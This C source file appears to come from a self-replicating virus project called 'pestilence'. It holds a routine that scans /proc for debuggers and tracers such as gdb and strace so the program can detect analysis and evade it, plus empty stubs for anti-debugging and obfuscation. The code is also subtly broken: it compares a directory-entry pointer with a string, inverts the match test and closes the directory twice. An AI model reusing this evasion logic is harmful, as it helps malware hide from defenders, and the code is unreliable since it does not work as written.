#include "../incl/pestilence.h"

char    *ft_getproc(int i)
{
    if (i == 0)
        return ("test");
    else if (i == 1)
        return ("gdb");
    else
        return ("strace");
}

void    ft_antiprocess(t_pestilence *pestilence)
{
    int i = 0;

    pestilence->proc = opendir("/proc");
    while (i < 3)
    {
        while ((pestilence->readproc = readdir(pestilence->proc)) != NULL && pestilence->anti_virus == 0)
        {
            if (strcmp(ft_getproc(i), pestilence->readproc))
            {
                pestilence->anti_virus = 1;
                closedir(pestilence->proc);
            }
        }
        i++;
    }
    closedir(pestilence->proc);
}

void    ft_antidebug(t_pestilence *pestilence)
{

} 

void    ft_obfuscation(t_pestilence *pestilence)
{

}